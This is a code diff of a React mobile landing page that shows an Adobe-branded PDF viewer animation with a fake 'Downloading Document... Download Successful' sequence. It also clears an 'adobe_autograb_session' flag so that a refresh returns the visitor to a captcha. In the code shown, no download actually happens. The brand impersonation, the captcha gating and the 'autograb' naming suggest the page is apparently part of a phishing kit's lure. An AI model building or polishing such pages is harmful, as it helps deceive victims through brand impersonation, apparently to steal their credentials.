@@ -5,12 +5,13 @@ interface MobileLandingPageProps {
 }
 
 /**
- * Updated behavior per request:
- * - Replace static Adobe icon background with a real (CSS) PDF document animation component.
- * - Run one flow: "Downloading..." -> "Download Successful" -> then hide text,
- *   leaving the PDF document visible plainly (no success text over it).
- * - Text should be clearly visible without heavy high-contrast styling.
- * - Keep session gating and removal of 'adobe_autograb_session' when complete.
+ * Behavior per request:
+ * - Realistic PDF viewer animation.
+ * - Flow: "Downloading..." -> "Download Successful" -> hide text,
+ *   document remains plainly visible.
+ * - Text readable without high-contrast outlines.
+ * - Session gating + remove 'adobe_autograb_session' on completion.
+ * - The provided image is displayed inside the page frame (centered, contained).
  */
 const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
   const [showOverlay, setShowOverlay] = useState(false);
@@ -39,7 +40,6 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
       const alreadyShown = sessionStorage.getItem(shownKey);
       if (alreadyShown) return;
 
-      // Start sequence
       setShowOverlay(true);
       setPhase('downloading');
       setDocAnimating(true);
@@ -61,12 +61,10 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         try {
           sessionStorage.setItem(shownKey, new Date().toISOString());
         } catch {}
-        // Remove persisted session so a full refresh returns to captcha
         try {
           localStorage.removeItem('adobe_autograb_session');
         } catch {}
 
-        // Hide overlay text shortly after showing success, leaving the doc plain.
         hideOverlayTimeoutRef.current = window.setTimeout(() => {
           setShowOverlay(false);
           setPhase('idle');
@@ -77,9 +75,7 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         successTimeoutRef.current = null;
       }, 3000) as unknown as number;
 
-    } catch (e) {
-      // ignore
-    }
+    } catch {}
 
     return () => {
       if (dotIntervalRef.current) {
@@ -101,15 +97,17 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
     <div
       style={{
         minHeight: '100vh',
-        background: '#f4f6f8',
+        background: '#f5f7fa',
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
         color: '#111'
       }}
     >
-      {/* PDF Document Animation replacing previous static icon */}
-      <PDFDocumentMobile animating={docAnimating} />
+      <RealisticPDFMobile
+        animating={docAnimating}
+        imageUrl="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Adobe_CreatePDF_icon.png/640px-Adobe_CreatePDF_icon.png"
+      />
 
       {showOverlay && (
         <div
@@ -126,15 +124,15 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
         >
           <div
             style={{
-              color: '#111',
+              color: '#1f2937',
               fontSize: 16,
               fontWeight: 600,
               textAlign: 'center',
               padding: '10px 14px',
               borderRadius: 10,
-              background: 'rgba(255,255,255,0.94)',
+              background: 'rgba(255,255,255,0.95)',
               border: '1px solid rgba(0,0,0,0.06)',
-              boxShadow: '0 4px 16px rgba(0,0,0,0.08)'
+              boxShadow: '0 6px 20px rgba(0,0,0,0.08)'
             }}
           >
             {phase === 'downloading' && <span>Downloading Document{dots}</span>}
@@ -146,75 +144,220 @@ const MobileLandingPage: React.FC<MobileLandingPageProps> = () => {
   );
 };
 
-function PDFDocumentMobile({ animating }: { animating: boolean }) {
+function RealisticPDFMobile({ animating, imageUrl }: { animating: boolean; imageUrl: string }) {
   return (
-    <div style={{ position: 'relative' }}>
+    <div style={{ position: 'relative' }} aria-hidden="true">
       <style>
         {`
-          @keyframes pdfFloatMobile {
-            0%   { transform: translateY(0px);   }
-            50%  { transform: translateY(-8px);  }
-            100% { transform: translateY(0px);   }
-          }
-          .pdf-doc-m {
-            position: relative;
-            width: 180px;
-            height: 225px;
+          .pdf-viewer-m {
+            width: 270px;
             border-radius: 12px;
-            background: #ffffff;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.12);
-            transition: transform 300ms ease;
+            background: #e9eef3;
+            box-shadow: 0 14px 36px rgba(0,0,0,0.12);
+            border: 1px solid #d8e0e8;
+            overflow: hidden;
           }
-          .pdf-doc-m.animating {
-            animation: pdfFloatMobile 3s ease-in-out infinite;
+
+          .pdf-toolbar-m {
+            height: 42px;
+            background: linear-gradient(0deg, #f7fafc, #ffffff);
+            border-bottom: 1px solid #e6ebf1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 8px 0 10px;
           }
-          .pdf-fold-m {
-            position: absolute;
-            top: 0;
-            right: 0;
-            width: 0;
-            height: 0;
-            border-left: 26px solid transparent;
-            border-top: 26px solid #eceff3;
-            border-top-right-radius: 8px;
+          .pdf-toolbar-left-m {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #374151;
+            font-weight: 600;
+            font-size: 12px;
           }
+          .pdf-toolbar-dots-m {
+            display: inline-flex;
+            gap: 5px;
+            margin-right: 4px;
+          }
+          .pdf-toolbar-dots-m i {
+            width: 7px; height: 7px; border-radius: 50%;
+          }
+          .pdf-toolbar-dots-m i:nth-child(1) { background: #ef4444; }
+          .pdf-toolbar-dots-m i:nth-child(2) { background: #f59e0b; }
+          .pdf-toolbar-dots-m i:nth-child(3) { background: #10b981; }
+
           .pdf-badge-m {
-            position: absolute;
-            top: 10px;
-            left: 10px;
             background: #e53935;
             color: #fff;
             font-weight: 700;
-            font-size: 11px;
+            font-size: 9px;
             padding: 3px 7px;
-            border-radius: 6px;
+            border-radius: 999px;
             letter-spacing: 0.6px;
           }
-          .pdf-lines-m span {
-            display: block;
-            height: 8px;
-            background: #e9eef3;
-            border-radius: 6px;
-            margin: 10px 14px;
+
+          .pdf-viewport-m {
+            height: 380px;
+            background: radial-gradient(120% 50% at 50% 0%, #f8fafc 0%, #eef2f7 60%, #e9eef3 100%);
+            display: grid;
+            place-items: center;
+            padding: 14px 0;
           }
-          .pdf-lines-m span:nth-child(1) { width: 78%; margin-top: 52px; }
-          .pdf-lines-m span:nth-child(2) { width: 62%; }
-          .pdf-lines-m span:nth-child(3) { width: 86%; }
-          .pdf-lines-m span:nth-child(4) { width: 70%; }
-          .pdf-lines-m span:nth-child(5) { width: 82%; }
+
+          .pages-track-m {
+            position: relative;
+            width: 220px;
+            height: 100%;
+            perspective: 700px;
+          }
+
+          .page-stack-m {
+            position: absolute;
+            inset: 0;
+            display: grid;
+            place-items: center;
+          }
+
+          .page-m {
+            position: relative;
+            width: 220px;
+            height: 312px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow:
+              0 1px 0 rgba(0,0,0,0.05),
+              0 6px 16px rgba(0,0,0,0.12);
+            border: 1px solid rgba(0,0,0,0.06);
+          }
+          .page-m.back { transform: translateY(7px) scale(0.995); filter: saturate(0.95) brightness(0.995); }
+          .page-m.back2 { transform: translateY(14px) scale(0.99); filter: saturate(0.92) brightness(0.99); }
+
+          .curl-m {
+            position: absolute;
+            top: 0; right: 0;
+            width: 30px; height: 30px;
+            background: linear-gradient(135deg, #f3f6fb 0%, #e5ebf2 70%, rgba(0,0,0,0) 71%);
+            clip-path: polygon(100% 0, 0 0, 100% 100%);
+            border-top-right-radius: 10px;
+          }
+
+          .content-m {
+            position: absolute;
+            inset: 14px 16px 16px 16px;
+            display: flex;
+            flex-direction: column;
+          }
+          .header-bar-m {
+            height: 16px;
+            background: #f7fafc;
+            border: 1px solid #eef2f7;
+            border-radius: 6px;
+            margin-bottom: 10px;
+          }
+
+          .imagePreview-m {
+            flex: 1;
+            border: 1px solid #dbe3ed;
+            border-radius: 8px;
+            background: #f5f8fb;
+            display: grid;
+            place-items: center;
+            overflow: hidden;
+          }
+          .imagePreview-inner-m {
+            width: 100%;
+            height: 100%;
+            background-position: center center;
+            background-repeat: no-repeat;
+            background-size: contain; /* keep full image visible inside frame */
+          }
+
+          .footer-lines-m {
+            margin-top: 8px;
+          }
+          .para-m {
+            height: 7px;
+            background: #eef2f7;
+            border-radius: 5px;
+            margin: 5px 0;
+          }
+          .para-m.w1 { width: 68%; }
+          .para-m.w2 { width: 46%; }
+
+          @keyframes floatDocM {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-7px); }
+            100% { transform: translateY(0px); }
+          }
+          .page-m.front.anim {
+            animation: floatDocM 3s ease-in-out infinite;
+            transform-origin: 50% 100%;
+          }
+
+          .turn-glint-m {
+            position: absolute;
+            top: 9px;
+            right: 0;
+            width: 9px;
+            height: calc(100% - 18px);
+            background: linear-gradient(90deg, rgba(0,0,0,0) 0%, rgba(220,230,240,0.6) 80%, rgba(0,0,0,0) 100%);
+            opacity: 0;
+          }
+          @keyframes glintSweepM {
+            0% { opacity: 0; transform: translateX(9px); }
+            20% { opacity: 0.5; transform: translateX(-2px); }
+            100% { opacity: 0; transform: translateX(-10px); }
+          }
+          .page-m.front.anim .turn-glint-m {
+            animation: glintSweepM 2.6s ease-in-out infinite;
+          }
+
+          @media (prefers-reduced-motion: reduce) {
+            .page-m.front.anim, .page-m.front.anim .turn-glint-m { animation: none !important; }
+          }
         `}
       </style>
-      <div className={`pdf-doc-m ${animating ? 'animating' : ''}`}>
-        <div className="pdf-fold-m" />
-        <div className="pdf-badge-m">PDF</div>
-        <div className="pdf-lines-m">
-          <span />
-          <span />
-          <span />
-          <span />
-          <span />
+
+      <div className="pdf-viewer-m">
+        <div className="pdf-toolbar-m">
+          <div className="pdf-toolbar-left-m">
+            <span className="pdf-toolbar-dots-m" aria-hidden="true">
+              <i></i><i></i><i></i>
+            </span>
+            <span>Document.pdf</span>
+          </div>
+          <span className="pdf-badge-m">PDF</span>
         </div>
-      </div>
+
+        <div className="pdf-viewport-m">
+          <div className="pages-track-m">
+            <div className="page-stack-m">
+              <div className="page-m back2"></div>
+              <div className="page-m back"></div>
+
+              <div className={`page-m front ${animating ? 'anim' : ''}`}>
+                <div className="curl-m" />
+                <div className="turn-glint-m" />
+                <div className="content-m">
+                  <div className="header-bar-m" />
+                  <div className="imagePreview-m">
+                    <div
+                      className="imagePreview-inner-m"
+                      style={{ backgroundImage: `url("${imageUrl}")` }}
+                      aria-label="Document preview image"
+                    />
+                  </div>
+                  <div className="footer-lines-m" aria-hidden="true">
+                    <div className="para-m w1" />
+                    <div className="para-m w2" />
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div> 
     </div>
   );
 }
